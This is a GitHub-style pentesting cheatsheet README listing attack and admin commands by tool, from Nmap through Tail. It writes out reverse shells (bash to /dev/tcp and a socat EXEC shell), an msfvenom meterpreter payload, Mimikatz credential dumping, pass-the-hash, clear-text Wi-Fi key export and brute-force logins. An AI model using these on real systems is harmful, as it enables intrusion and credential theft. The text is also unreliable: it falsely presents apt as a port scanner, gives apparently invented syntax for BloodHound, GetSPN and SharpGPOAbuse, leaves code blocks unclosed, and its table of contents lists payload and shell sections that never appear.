
# Penooo-Cheatsheet for Pentesting

A collection of **useful commands and scripts** for pentesting tools, organized by the specific tools used. This repository serves as a handy reference for commonly used tools and their commands, making your pentesting tasks faster and more efficient.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Tool-Based Commands](#tool-based-commands)
  - [Nmap](#nmap)
  - [Gobuster](#gobuster)
  - [Metasploit](#metasploit)
  - [Netcat](#netcat)
  - [SearchSploit](#searchsploit)
  - [TCPDump](#tcpdump)
  - [GMSAPasswordReader](#gmsapasswordreader)
  - [GetSPN](#getspn)
  - [PowerUp](#powerup)
  - [Powerview](#powerview)
  - [PrivescCheck](#privesccheck)
  - [SharpGPOAbuse](#sharpgpoabuse)
  - [Accesschk](#accesschk)
  - [Apt](#apt)
  - [Arp](#arp)
  - [Awk](#awk)
  - [Bc](#bc)
  - [Bettercap](#bettercap)
  - [BloodHound](#bloodhound)
  - [Cadaver](#cadaver)
  - [Cat](#cat)
  - [Certutil](#certutil)
  - [Cewl](#cewl)
  - [Chisel](#chisel)
  - [Cmd](#cmd)
  - [Comm](#comm)
  - [Crackmapexec](#crackmapexec)
  - [Crowbar](#crowbar)
  - [Crunch](#crunch)
  - [Curl](#curl)
  - [Cut](#cut)
  - [Debugfs](#debugfs)
  - [Diff](#diff)
  - [Dig](#dig)
  - [Dir](#dir)
  - [Dirb](#dirb)
  - [Dnsrecon](#dnsrecon)
  - [Docker](#docker)
  - [Empsave.dat](#empsavedat)
  - [Evil-winrm](#evil-winrm)
  - [Exiftool](#exiftool)
  - [Ffuf](#ffuf)
  - [Find](#find)
  - [Findstr](#findstr)
  - [Foremost](#foremost)
  - [Gcc](#gcc)
  - [Git](#git)
  - [Gobuster](#gobuster)
  - [Gpg](#gpg)
  - [Hashcat](#hashcat)
  - [Host](#host)
  - [Httptunnel](#httptunnel)
  - [Hydra](#hydra)
  - [Icacls](#icacls)
  - [Iconv](#iconv)
  - [Impacket](#impacket)
  - [Ip](#ip)
  - [Iptables](#iptables)
  - [John](#john)
  - [Kerberoast](#kerberoast)
  - [Ln](#ln)
  - [Ls](#ls)
  - [Mailman.com_ips.txt](#mailmancom_ipstxt)
  - [Man](#man)
  - [Masscan](#masscan)
  - [Medusa](#medusa)
  - [Metasploit](#metasploit)
  - [Mimikatz](#mimikatz)
  - [Mingw-64](#mingw-64)
  - [Mklink](#mklink)
  - [Mosquitto_sub](#mosquitto_sub)
  - [Mount](#mount)
  - [Msfvenom](#msfvenom)
  - [Mysql](#mysql)
  - [Nbt scan](#nbt-scan)
  - [Nc](#nc)
  - [Nessus](#nessus)
  - [Net](#net)
  - [Netsh](#netsh)
  - [Netstat](#netstat)
  - [Nmap](#nmap)
  - [Nslookup](#nslookup)
  - [Onesixtyone](#onesixtyone)
  - [Openssl](#openssl)
  - [Passwd](#passwd)
  - [Phpggc](#phpggc)
  - [Plink](#plink)
  - [Powercat](#powercat)
  - [Powershell](#powershell)
  - [Psexec](#psexec)
  - [Pth-winexe](#pth-winexe)
  - [Python](#python)
  - [Recon-ng](#recon-ng)
  - [Redis](#redis)
  - [Reg](#reg)
  - [Responder](#responder)
  - [Rinetd](#rinetd)
  - [Rlwrap](#rlwrap)
  - [Rpcclient](#rpcclient)
  - [Rsmangler](#rsmangler)
  - [Runas](#runas)
  - [Sc](#sc)
  - [Schtasks](#schtasks)
  - [Scp](#scp)
  - [Sed](#sed)
  - [SendEmail](#sendemail)
  - [Sharphound](#sharphound)
  - [Shellter](#shellter)
  - [Simple-server](#simple-server)
  - [Smbclient](#smbclient)
  - [Snmpwalk](#snmpwalk)
  - [Socat](#socat)
  - [Spose](#spose)
  - [Sqlmap](#sqlmap)
  - [Sqsh](#sqsh)
  - [Ssh](#ssh)
  - [Steghide](#steghide)
  - [Svn](#svn)
  - [Tail](#tail)
  - [Tar](#tar)
  - [Tasklist](#tasklist)
  - [Tcpdump](#tcpdump)
  - [Terminal](#terminal)
  - [Theharverster](#theharverster)
  - [Tr](#tr)
  - [Ufw](#ufw)
  - [Uname](#uname)
  - [Watch](#watch)
  - [Wc](#wc)
  - [Webservers](#webservers)
  - [Wfuzz](#wfuzz)
  - [Whois](#whois)
  - [Wpscan](#wpscan)
  - [Xfreerdp](#xfreerdp)
  - [Xxd](#xxd)
  - [Ysosoerial](#ysosoerial)
- [Payloads](#payloads)
  - [Cross-Site Scripting (XSS) Payloads](#xss-payloads)
  - [XML External Entity (XXE) / XML Payloads](#xml-payloads)
  - [SQL Injection (SQLi) Payloads](#sql-payloads)
  - [Antivirus (AV) Bypass](#av-bypass)
  - [Buffer Overflow (BOF) Linux (LIN)](#bof-lin)
  - [Buffer Overflow (BOF) Windows (WIN)](#bof-win)
  - [Access Control Vulnerabilities](#access-control-vulnerabilities)
  - [Active Directory (AD)](#ad)
  - [Bindshells](#bindshells)
  - [Brute Force](#brute-force)
  - [Clickjacking](#clickjacking)
  - [Cross-Origin Resource Sharing (CORS)](#cors)
  - [Cross-Site Request Forgery (CSRF)](#csrf)
  - [Database Vulnerabilities (DB)](#db)
  - [Directory Traversal (DIR)](#dir)
  - [File Transfer](#file-transfer)
  - [File Upload](#file-upload)
  - [File Transfer Protocol (FTP)](#ftp)
  - [GraphQL](#graphql)
  - [Hashing Attacks](#hash)
  - [Host Header Injection](#host-header-injection)
  - [HTML Application (HTA)](#hta)
  - [HTTP Header Attacks](#http-header)
  - [HTTP Request Smuggling](#http-request-smuggling)
  - [Internet Relay Chat (IRC)](#irc)
  - [JSON Web Token (JWT)](#jwt)
  - [Local File Inclusion (LFI)](#lfi)
  - [Macros](#macro)
  - [Network File System (NFS)](#nfs)
  - [Operating System (OS) Vulnerabilities](#os)
  - [Other Vulnerabilities](#others)
  - [phpMyAdmin](#phpmyadmin)
  - [Privilege Escalation Linux (LIN)](#priv-lin)
  - [Privilege Escalation Windows (WIN)](#priv-win)
  - [Reverse Shells](#reverseshells)
  - [Remote File Inclusion (RFI)](#rfi)
  - [Serialization and Deserialization Vulnerabilities](#serialization-deserialization)
  - [Shellshock](#shellshock)
  - [Server Message Block (SMB)](#smb)
  - [Simple Mail Transfer Protocol (SMTP)](#smtp)
  - [Simple Network Management Protocol (SNMP)](#snmp)
  - [Server-Side Request Forgery (SSRF)](#ssrf)
  - [Server-Side Template Injection (SSTI)](#ssti)
  - [Symfony](#symfony)
  - [Trivial File Transfer Protocol (TFTP)](#tftp)
  - [Web Cache Poisoning](#web-cache-poisoning)
  - [Wireless Vulnerabilities](#wireless)
  - [wkhtmltopdf](#wkhtmltopdf)
  - [WordPress (WP)](#wp)
  - [WebSocket (WS)](#ws)
  - [XPath Injection](#xpath)
- [Shells](#shells)
  - [Reverse Shells](#reverse-shells)
  - [Bind Shells](#bind-shells)
- [Useful Resources](#useful-resources)
  - [Payloads and Exploits](#payloads-and-exploits)
  - [Pentesting Guides](#pentesting-guides)
  - [Security Tools](#security-tools)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- Comprehensive list of commands for various pentesting tools
- Pre-written scripts for automating common activities
- Beginner-friendly and updated with modern techniques

---

## Installation

Clone the repository to your local machine:

```bash
git clone https://github.com/<your-username>/cheatsheet-pentesting.git
```

Navigate to the directory:

```bash
cd cheatsheet-pentesting
```

---

## Usage

1. Browse through the tool categories to find relevant commands or scripts.
2. Use the provided commands directly in your terminal.
3. For scripts, make them executable if needed:

   ```bash
   chmod +x <script-name>.sh
   ./<script-name>.sh
   ```

4. Customize the scripts based on your specific target or environment.

---

## Tool-Based Commands

### Nmap
- **Basic Scan**:
  ```bash
  nmap -sV -A <target-IP>
  ```

- **Scan Specific Ports**:
  ```bash
  nmap -p 80,443 <target-IP>
  ```

- **OS Detection**:
  ```bash
  nmap -O <target-IP>
  ```

### Gobuster
- **Directory Enumeration**:
  ```bash
  gobuster dir -u http://<target> -w /path/to/wordlist.txt
  ```

- **DNS Subdomain Enumeration**:
  ```bash
  gobuster dns -d <target-domain> -w /path/to/wordlist.txt
  ```

### Metasploit
- **Start Metasploit Console**:
  ```bash
  msfconsole
  ```

- **Search for Exploits**:
  ```bash
  search <exploit-name>
  ```

- **Use an Exploit**:
  ```bash
  use <exploit-path>
  ```

### Netcat
- **Set Up a Listener**:
  ```bash
  nc -lvnp 4444
  ```

- **Send a File**:
  ```bash
  nc -w 3 <target-IP> 1234 < file.txt
  ```

- **Reverse Shell**:
  ```bash
  bash -i >& /dev/tcp/<your-IP>/4444 0>&1
  ```

### SearchSploit
- **Search for Exploits**:
  ```bash
  searchsploit <software-name>
  ```

- **Copy Exploit to Current Directory**:
  ```bash
  searchsploit -m <exploit-path>
  ```

### TCPDump
- **Capture Traffic on an Interface**:
  ```bash
  tcpdump -i <interface>
  ```

- **Write Capture to File**:
  ```bash
  tcpdump -i <interface> -w capture.pcap
  ```

- **Filter by Port**:
  ```bash
  tcpdump -i <interface> port 80
  ```

### GMSAPasswordReader
- **Retrieve gMSA Password**:
  ```powershell
  GMSAPasswordReader.exe <gMSA-Name>
  ```
- **Retrieving the Hash of a Service Account**:
  ```powershell
  ./GMSAPasswordReader.exe --accountname svc_apache
  ```

---

### GetSPN
- **List SPNs for a Domain**:
  ```powershell
  GetSPN -Domain <domain> -Username <username>
  ```

- **Export SPNs to File**:
  ```powershell
  GetSPN -Domain <domain> -Username <username> > spns.txt
  ```
- **Retrieving Service Names from Active Directory**:
  ```powershell
  Get-NetUser -SPN | Select-Object serviceprincipalname
  Get-NetUser -SPN | select serviceprincipalname
  ```
---

### PowerUp
- **Check Privilege Escalation Opportunities**:
  ```powershell
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks
  ```

---

### Powerview
- **List Domain Admins**:
  ```powershell
  Get-DomainAdmin
  ```

- **Enumerate All Group Memberships**:
  ```powershell
  Get-DomainGroupMember -GroupName "Domain Admins"
  ```

- **Find Local Admins on Target Machine**:
  ```powershell
  Get-NetLocalGroupMember -Group "Administrators" -Computer <target-computer>
  ```

---

### PrivescCheck
- **Run Privilege Escalation Checks**:
  ```powershell
  .\PrivescCheck.ps1
  Invoke-PrivescCheck -Extended
  ```

---

### SharpGPOAbuse
- **Dump Group Policy Objects**:
  ```powershell
  SharpGPOAbuse.exe -domain <domain> -user <username> -password <password>
  ```

- **Check for GPO Misconfigurations**:
  ```powershell
  SharpGPOAbuse.exe -gpo <gpo-name> -check
  ```

---

### accesschk
- **Check User Permissions on a File**:
  ```bash
  accesschk.exe -u <username> <file-path>
  ```

- **Check Permissions on Registry Key**:
  ```bash
  accesschk.exe -k <registry-key-path>
  ```

- **Check for Vulnerable Services to Exploit**:
  ```bash
  accesschk.exe /accepteula -uwcqv "Authenticated Users" *
  ```
  u: Check the permissions for the user or group specified.
  w: Look for write permissions.
  c: Check for the ability to change service configurations.
  q: Suppress warnings and only display the output.
  v: Verbose output.
  Authenticated Users: Specifies the target user group. This tells the tool to check permissions for all authenticated users.
  *: Checks all services on the system for the specified permissions.
---

### apt
- **Scan for Open Ports**:
  ```bash
  apt -s -p <ip-range>
  ```

- **Perform OS Detection**:
  ```bash
  apt -s -O <ip-address>
  ```

---

### arp
- **Display ARP Table**:
  ```bash
  arp -a
  ```

- **Add Static ARP Entry**:
  ```bash
  arp -s <ip-address> <mac-address>
  ```

---

### awk
- **Print Column from File**:
  ```bash
  awk '{print $1}' <file>
  ```

- **Search for a Pattern in File**:
  ```bash
  awk '/pattern/' <file>
  ```

---

### bc
- **Basic Arithmetic**:
  ```bash
  echo "3 + 4" | bc
  ```

- **Square Root Calculation**:
  ```bash
  echo "sqrt(16)" | bc
  ```

---

### bettercap
- **Start Sniffing on Interface**:
  ```bash
  bettercap -iface <interface> -caplet http-server
  ```

- **Enable HTTP Proxy**:
  ```bash
  bettercap -iface <interface> -proxy
  ```

---

### bloodHound
- **Import Data into BloodHound**:
  ```bash
  BloodHound -c <config-file> -i <input-file>
  ```

- **Run BloodHound Enumeration**:
  ```bash
  BloodHound -c <config-file> -u <username> -p <password>
  ```

---

### cadaver
- **Connect to WebDAV Server**:
  ```bash
  cadaver <url>
  ```

- **List Files in Directory**:
  ```bash
  ls
  ```

---

### cat
- **View File Content**:
  ```bash
  cat <file-path>
  ```

- **Concatenate Multiple Files**:
  ```bash
  cat <file1> <file2>
  ```

---

### certutil
- **Check Certificate Information**:
  ```bash
  certutil -dump <certificate-file>
  ```

- **Export Certificate**:
  ```bash
  certutil -exportPFX -user <certificate-name> <output-file>
  ```

---

### cewl
- **Create Custom Wordlist from URL**:
  ```bash
  cewl <url> -w <output-file>
  ```

- **Create Wordlist from Specific Lengths**:
  ```bash
  cewl <url> -w <output-file> -l <min-length> -l <max-length>
  ```

---

### chisel
- **Start a Local HTTP Proxy**:
  ```bash
  chisel server -p <port> --reverse
  ```

- **Connect to Remote HTTP Proxy**:
  ```bash
  chisel client <remote-server>:<remote-port> <local-port>:http
  ```

---

### cmd
- **Open Command Prompt**:
  ```bash
  cmd
  ```

- **Run Command in Command Prompt**:
  ```bash
  cmd /c <command>
  ```

---

### comm
- **Compare Two Files**:
  ```bash
  comm <file1> <file2>
  ```

- **Suppress Column from Output**:
  ```bash
  comm -23 <file1> <file2>
  ```

---

### crackmapexec
- **Enumerate SMB Shares**:
  ```bash
  crackmapexec smb <target-ip> -u <username> -p <password> --shares
  ```

- **Run Commands on Target Machines**:
  ```bash
  crackmapexec smb <target-ip> -u <username> -p <password> -x "<command>"
  ```

### crowbar
- **Brute Force SMB Login**:
  ```bash
  crowbar smb -b <ip-address> -u <username> -p <password-list>
  ```

- **Brute Force SSH Login**:
  ```bash
  crowbar ssh -b <ip-address> -u <username> -p <password-list>
  ```

---

### crunch
- **Generate Wordlist of Given Lengths**:
  ```bash
  crunch <min-length> <max-length> -o <output-file>
  ```

- **Generate Wordlist with Custom Characters**:
  ```bash
  crunch <min-length> <max-length> -o <output-file> -p <charset>
  ```

---

### curl
- **Make a GET Request**:
  ```bash
  curl http://<url>
  ```

- **Download a File**:
  ```bash
  curl -O <url>
  ```

- **Send POST Request with Data**:
  ```bash
  curl -X POST -d "username=<username>&password=<password>" http://<url>
  ```

---

### cut
- **Cut Specific Field from Text**:
  ```bash
  cut -d '<delimiter>' -f <field-number> <file>
  ```

- **Cut from Character Range**:
  ```bash
  cut -c <range> <file>
  ```

---

### debugfs
- **View Files in Ext2/Ext3 Filesystem**:
  ```bash
  debugfs <device>
  ```

- **Dump File Contents**:
  ```bash
  debugfs -R 'cat <file-path>' <device>
  ```

---

### diff
- **Compare Two Files**:
  ```bash
  diff <file1> <file2>
  ```

- **Show Side-by-Side Difference**:
  ```bash
  diff -y <file1> <file2>
  ```

---

### dig
- **Query DNS for a Domain**:
  ```bash
  dig <domain>
  ```

- **Query DNS for a Specific Record Type**:
  ```bash
  dig <domain> <record-type>
  ```

---

### dir
- **List Files in Directory**:
  ```bash
  dir <directory-path>
  ```

- **List All Files with Details**:
  ```bash
  dir /s <directory-path>
  ```

---

### dirb
- **Directory Bruteforce Scan**:
  ```bash
  dirb http://<url> <wordlist>
  ```

- **Set Proxy for Directory Scan**:
  ```bash
  dirb http://<url> <wordlist> -p <proxy>
  ```

---

### dnsrecon
- **Perform DNS Enumeration**:
  ```bash
  dnsrecon -d <domain>
  ```

- **Perform Reverse DNS Lookup**:
  ```bash
  dnsrecon -r <ip-range>
  ```

---

### docker
- **List Running Containers**:
  ```bash
  docker ps
  ```

- **Run a Container**:
  ```bash
  docker run -it <image-name>
  ```

- **Build Docker Image from Dockerfile**:
  ```bash
  docker build -t <image-name> .
  ```

---

### empsave.dat
- **Extract Passwords from empsave.dat**:
  ```bash
  python3 empsave.py empsave.dat
  ```

---

### evil-winrm
- **Start Evil-WinRM Session**:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password>
  ```

- **Execute Command on Target Machine**:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password> -c "<command>"
  ```

---

### exiftool
- **View Metadata of a File**:
  ```bash
  exiftool <file>
  ```

- **Extract Specific Metadata Field**:
  ```bash
  exiftool -<field-name> <file>
  ```

---

### ffuf
- **Directory Bruteforce Scan**:
  ```bash
  ffuf -w <wordlist> -u http://<url>/FUZZ
  ```

- **Find Hidden DNS Subdomains**:
  ```bash
  ffuf -w <subdomain-wordlist> -u <domain>/FUZZ
  ```

---

### find
- **Search for Files by Name**:
  ```bash
  find /path/to/search -name "<file-name>"
  ```

- **Search Files by Permission**:
  ```bash
  find /path/to/search -perm <permission>
  ```

---

### findstr
- **Search for String in Files**:
  ```bash
  findstr "<string>" <file>
  ```

- **Search in Files Recursively**:
  ```bash
  findstr /s "<string>" <directory-path>\*.*
  ```

---

### foremost
- **Recover Deleted Files**:
  ```bash
  foremost -i <image-file> -o <output-dir>
  ```

- **Use Specific File Types for Recovery**:
  ```bash
  foremost -t <file-types> -i <image-file> -o <output-dir>
  ```

---

### gcc
- **Compile a C Program**:
  ```bash
  gcc -o <output-file> <source-file.c>
  ```

- **Compile with Debugging Symbols**:
  ```bash
  gcc -g -o <output-file> <source-file.c>
  ```

---

### git
- **Clone a Repository**:
  ```bash
  git clone <repository-url>
  ```

- **Check the Status of a Git Repository**:
  ```bash
  git status
  ```
### GPG
- **Encrypt a File**:
  ```bash
  gpg -c <file>
  ```

- **Decrypt a File**:
  ```bash
  gpg <file>.gpg
  ```

- **Generate a GPG Key Pair**:
  ```bash
  gpg --gen-key
  ```

### Hashcat
- **Start Hashcat with a Wordlist**:
  ```bash
  hashcat -m <hash_type> <hash_file> <wordlist>
  ```

- **Show Supported Hash Types**:
  ```bash
  hashcat --help | grep Hash
  ```

- **Resume a Session**:
  ```bash
  hashcat --session <session_name> --restore
  ```

### Host
- **Lookup an IP Address for a Hostname**:
  ```bash
  host <hostname>
  ```

- **Reverse Lookup an IP**:
  ```bash
  host <IP_address>
  ```

### HTTPTunnel
- **Create an HTTP Tunnel Client**:
  ```bash
  httptunnel -c <client_port> <server_host>:<server_port>
  ```

- **Start an HTTP Tunnel Server**:
  ```bash
  httptunnel -s <server_port>
  ```

### Hydra
- **Brute Force SSH Login**:
  ```bash
  hydra -l <username> -P <password_list> ssh://<target_ip>
  ```

- **Brute Force HTTP Basic Authentication**:
  ```bash
  hydra -L <user_list> -P <password_list> http-get://<target_ip>
  ```

### ICACLS
- **Display File Permissions**:
  ```cmd
  icacls <file>
  ```

- **Grant Permissions**:
  ```cmd
  icacls <file> /grant <user>:(<permissions>)
  ```

- **Remove All Permissions**:
  ```cmd
  icacls <file> /remove <user>
  ```

### Iconv
- **Convert File Encoding**:
  ```bash
  iconv -f <source_encoding> -t <target_encoding> <input_file> -o <output_file>
  ```

- **Check Supported Encodings**:
  ```bash
  iconv --list
  ```

### Impacket
- **Run SMB Server**:
  ```bash
  impacket-smbserver <share_name> <share_path>
  ```

- **Execute Remote Command**:
  ```bash
  impacket-psexec <target_ip> -u <username> -p <password> <command>
  ```

### IP
- **Show IP Address of Interfaces**:
  ```bash
  ip addr
  ```

- **Add a New IP Address**:
  ```bash
  ip addr add <IP_address>/<CIDR> dev <interface>
  ```

- **Delete an IP Address**:
  ```bash
  ip addr del <IP_address>/<CIDR> dev <interface>
  ```

### IPTables
- **List Rules**:
  ```bash
  iptables -L
  ```

- **Add a Rule to Accept Traffic on a Port**:
  ```bash
  iptables -A INPUT -p tcp --dport <port> -j ACCEPT
  ```

- **Block an IP Address**:
  ```bash
  iptables -A INPUT -s <IP_address> -j DROP
  ```

### John
- **Run John the Ripper on a Password File**:
  ```bash
  john <password_file>
  ```

- **Show Cracked Passwords**:
  ```bash
  john --show <password_file>
  ```

### Kerberoast
- **Request a Service Ticket**:
  ```bash
  GetUserSPNs.py -request -dc-ip <domain_controller_ip> <domain>/<username>
  ```

- **Extract Service Tickets**:
  ```bash
  python kerberoast.py -t <ticket_file>
  ```

### LN
- **Create a Symbolic Link**:
  ```bash
  ln -s <target_file> <link_name>
  ```

- **Create a Hard Link**:
  ```bash
  ln <target_file> <link_name>
  ```

### LS
- **List Files in a Directory**:
  ```bash
  ls
  ```

- **Show Detailed Information**:
  ```bash
  ls -l
  ```

- **Show Hidden Files**:
  ```bash
  ls -a
  ```

### Mailman.com_ips.txt
- **Read IPs from a File and Ping Them**:
  ```bash
  while read ip; do ping -c 1 $ip; done < mailman.com_ips.txt
  ```

### Man
- **View Manual Page of a Command**:
  ```bash
  man <command>
  ```

- **Search for a Keyword in Manuals**:
  ```bash
  man -k <keyword>
  ```

### Masscan
- **Scan an IP Range for Open Ports**:
  ```bash
  masscan <IP_range> -p<ports>
  ```

- **Set Maximum Rate**:
  ```bash
  masscan <IP_range> -p<ports> --rate=<rate>
  ```

### Medusa
- **Brute Force Login for FTP**:
  ```bash
  medusa -h <host> -u <username> -P <password_list> -M ftp
  ```

- **Set Number of Parallel Connections**:
  ```bash
  medusa -h <host> -u <username> -P <password_list> -M ftp -t <threads>
  ```

### Mimikatz
- **Dump User Credentials**:
  ```cmd
  mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
  ```

- **Export Credentials to a File**:
  ```cmd
  mimikatz "privilege::debug" "sekurlsa::logonpasswords" > credentials.txt
  
### MinGW-64
- **Compile a C Program**:
  ```bash
  x86_64-w64-mingw32-gcc <source_file>.c -o <output_file>.exe
  ```

- **Compile with Debug Symbols**:
  ```bash
  x86_64-w64-mingw32-gcc -g <source_file>.c -o <output_file>.exe
  ```

### Mklink
- **Create a Symbolic Link**:
  ```cmd
  mklink <link_name> <target_path>
  ```

- **Create a Hard Link**:
  ```cmd
  mklink /H <link_name> <target_path>
  ```

- **Create a Directory Junction**:
  ```cmd
  mklink /J <junction_name> <target_path>
  ```

### Mosquitto_sub
- **Subscribe to a Topic**:
  ```bash
  mosquitto_sub -h <broker_address> -t <topic>
  ```

- **Subscribe with Authentication**:
  ```bash
  mosquitto_sub -h <broker_address> -u <username> -P <password> -t <topic>
  ```

### Mount
- **Mount a Filesystem**:
  ```bash
  mount <device> <mount_point>
  ```

- **Unmount a Filesystem**:
  ```bash
  umount <mount_point>
  ```

- **List Mounted Filesystems**:
  ```bash
  mount
  ```

### Msfvenom
- **Generate a Reverse Shell Payload**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe > payload.exe
  ```

- **List Available Payloads**:
  ```bash
  msfvenom -l payloads
  ```

### MySQL
- **Log in to MySQL**:
  ```bash
  mysql -u <username> -p
  ```

- **Execute an SQL Script**:
  ```bash
  mysql -u <username> -p <database> < script.sql
  ```

- **Show Databases**:
  ```sql
  SHOW DATABASES;
  ```

### NBTScan
- **Scan a Network for NetBIOS Names**:
  ```bash
  nbtscan <IP_range>
  ```

- **Scan with Verbose Output**:
  ```bash
  nbtscan -v <IP_range>
  ```

### Nessus
- **Start Nessus Service**:
  ```bash
  systemctl start nessusd
  ```

- **Check Nessus Status**:
  ```bash
  systemctl status nessusd
  ```

### Net
- **List Shared Resources**:
  ```cmd
  net share
  ```

- **Stop a Service**:
  ```cmd
  net stop <service_name>
  ```

### Netsh
- **Show Wireless Profiles**:
  ```cmd
  netsh wlan show profiles
  ```

- **Export a Wireless Profile**:
  ```cmd
  netsh wlan export profile name="<profile_name>" key=clear folder=<output_folder>
  ```

### Netstat
- **Show All Connections**:
  ```bash
  netstat -a
  ```

- **Show Listening Ports**:
  ```bash
  netstat -l
  ```

- **Show Connections by Process**:
  ```bash
  netstat -p
  ```

### Nslookup
- **Query an IP Address**:
  ```bash
  nslookup <hostname>
  ```

- **Set a Different DNS Server**:
  ```bash
  nslookup <hostname> <DNS_server>
  ```

### OneSixtyOne
- **Scan SNMP Devices**:
  ```bash
  onesixtyone -c <community_string_list> <IP_range>
  ```

- **Use a Specific Community String**:
  ```bash
  onesixtyone -s <community_string> <IP_range>
  ```

### OpenSSL
- **Generate a Private Key**:
  ```bash
  openssl genpkey -algorithm RSA -out private.key
  ```

- **Create a Self-Signed Certificate**:
  ```bash
  openssl req -x509 -new -key private.key -out cert.pem -days 365
  ```

### Passwd
- **Change Your Password**:
  ```bash
  passwd
  ```

- **Change Password for Another User**:
  ```bash
  sudo passwd <username>
  ```

### PHPGGC
- **Generate a PHP Gadget Chain**:
  ```bash
  phpggc <gadget> -o <output_file>
  ```

- **List Available Gadget Chains**:
  ```bash
  phpggc -l
  ```

### Plink
- **Initiate an SSH Connection**:
  ```bash
  plink -ssh <username>@<host>
  ```

- **Execute a Command on a Remote Host**:
  ```bash
  plink -ssh <username>@<host> <command>
  
### Powercat
- **Start a Listener**:
  ```powershell
  powercat -l -p <port> -t <protocol>
  ```

- **Send a File**:
  ```powershell
  powercat -c <host> -p <port> -i <file>
  ```

### PowerShell
- **Run a Script**:
  ```powershell
  powershell -File <script.ps1>
  ```

- **Execute a Command**:
  ```powershell
  powershell -Command "<command>"
  ```

### PsExec
- **Execute a Command on a Remote Host**:
  ```cmd
  psexec \\<host> -u <username> -p <password> <command>
  ```

- **Run Interactive Shell**:
  ```cmd
  psexec \\<host>
  ```

### PTH-Winexe
- **Run a Command with Pass-the-Hash**:
  ```bash
  pth-winexe -U <domain>/<username>%<hash> //<target_ip> <command>
  ```

### Python
- **Run a Python Script**:
  ```bash
  python <script.py>
  ```

- **Start Python Interactive Shell**:
  ```bash
  python
  ```

### Recon-ng
- **Start Recon-ng Framework**:
  ```bash
  recon-ng
  ```

- **Load a Module**:
  ```bash
  use <module>
  ```

### Redis
- **Connect to Redis CLI**:
  ```bash
  redis-cli
  ```

- **Flush All Data**:
  ```bash
  redis-cli FLUSHALL
  ```

### Reg
- **Query a Registry Key**:
  ```cmd
  reg query <key_path>
  ```

- **Add a Registry Key**:
  ```cmd
  reg add <key_path> /v <value_name> /t <type> /d <data>
  ```

### Responder
- **Start Responder**:
  ```bash
  responder -I <interface>
  ```

- **Run in Analysis Mode**:
  ```bash
  responder -I <interface> -A
  ```

### Rinetd
- **Add Port Forwarding Rule**:
  ```bash
  echo "<bind_ip> <bind_port> <target_ip> <target_port>" >> /etc/rinetd.conf
  ```

- **Restart Rinetd**:
  ```bash
  systemctl restart rinetd
  ```

### Rlwrap
- **Wrap a Command with Readline**:
  ```bash
  rlwrap <command>
  ```

- **Specify History File**:
  ```bash
  rlwrap -H <history_file> <command>
  ```

### Rpcclient
- **Connect to an SMB Server**:
  ```bash
  rpcclient -U <username> <target_ip>
  ```

- **Enumerate Users**:
  ```bash
  enumdomusers
  ```

### RSMangler
- **Generate Wordlists**:
  ```bash
  rsmangler --file <input_file> -o <output_file>
  ```

- **Use Custom Rules**:
  ```bash
  rsmangler --file <input_file> --rules
  ```

### Runas
- **Run a Program as Another User**:
  ```cmd
  runas /user:<username> "<command>"
  ```

- **Use Password Prompt**:
  ```cmd
  runas /user:<username> /savecred "<command>"
  ```

### SC
- **Query Service Status**:
  ```cmd
  sc query <service_name>
  ```

- **Start a Service**:
  ```cmd
  sc start <service_name>
  ```

### Schtasks
- **Create a Scheduled Task**:
  ```cmd
  schtasks /create /tn <task_name> /tr <command> /sc <schedule> /st <start_time>
  ```

- **Delete a Scheduled Task**:
  ```cmd
  schtasks /delete /tn <task_name>
  ```

### SCP
- **Copy a File to a Remote Server**:
  ```bash
  scp <file> <username>@<host>:<remote_path>
  ```

- **Copy a File from a Remote Server**:
  ```bash
  scp <username>@<host>:<remote_file> <local_path>
  ```

### Sed
- **Replace Text in a File**:
  ```bash
  sed -i 's/<old_text>/<new_text>/g' <file>
  ```

- **Print Specific Lines**:
  ```bash
  sed -n '<line_number>p' <file>
  
### SendEmail
- **Send an Email**:
  ```bash
  sendEmail -f <from_address> -t <to_address> -u <subject> -m <message> -s <smtp_server> -xu <username> -xp <password>
  ```

- **Attach a File**:
  ```bash
  sendEmail -f <from_address> -t <to_address> -u <subject> -m <message> -s <smtp_server> -a <file_path>
  ```

### SharpHound
- **Collect Data for BloodHound**:
  ```cmd
  SharpHound.exe -c All
  ```

- **Compress Output Files**:
  ```cmd
  SharpHound.exe -c All --zip
  ```

### Shellter
- **Run Shellter in Automatic Mode**:
  ```bash
  shellter -a
  ```

- **Specify Input and Output Files**:
  ```bash
  shellter -a -f <input_exe> -o <output_exe>
  ```

### Simple-Server
- **Start an HTTP Server**:
  ```bash
  python -m http.server <port>
  ```

### Smbclient
- **Connect to an SMB Share**:
  ```bash
  smbclient //<server>/<share>
  ```

- **Download a File**:
  ```bash
  get <file_name>
  ```

### Snmpwalk
- **Query an SNMP Device**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address>
  ```

- **Specify an OID**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
  ```

### Socat
- **Create a Reverse Shell**:
  ```bash
  socat TCP:<target_host>:<port> EXEC:/bin/bash
  ```

- **Forward a Port**:
  ```bash
  socat TCP-LISTEN:<local_port>,fork TCP:<target_host>:<target_port>
  ```

### Spose
- **Find File Paths**:
  ```bash
  spose <file_name>
  ```

### Sqlmap
- **Scan a URL for SQL Injection**:
  ```bash
  sqlmap -u <url>
  ```

- **Specify a POST Request**:
  ```bash
  sqlmap -u <url> --data="<POST_data>"
  ```

### Sqsh
- **Start a Session**:
  ```bash
  sqsh -S <server> -U <username> -P <password>
  ```

### SSH
- **Connect to a Server**:
  ```bash
  ssh <username>@<host>
  ```

- **Run a Command Remotely**:
  ```bash
  ssh <username>@<host> <command>
  ```

### Steghide
- **Embed Data in a File**:
  ```bash
  steghide embed -cf <cover_file> -ef <embed_file>
  ```

- **Extract Data from a File**:
  ```bash
  steghide extract -sf <stego_file>
  ```

### SVN
- **Check Out a Repository**:
  ```bash
  svn checkout <repo_url>
  ```

- **Commit Changes**:
  ```bash
  svn commit -m "<message>"
  ```

### Tail
- **View the End of a File**:
  ```bash
  tail <file>
  ```

- **Follow File Changes**:
  ```bash
  tail -f <file>
  ```

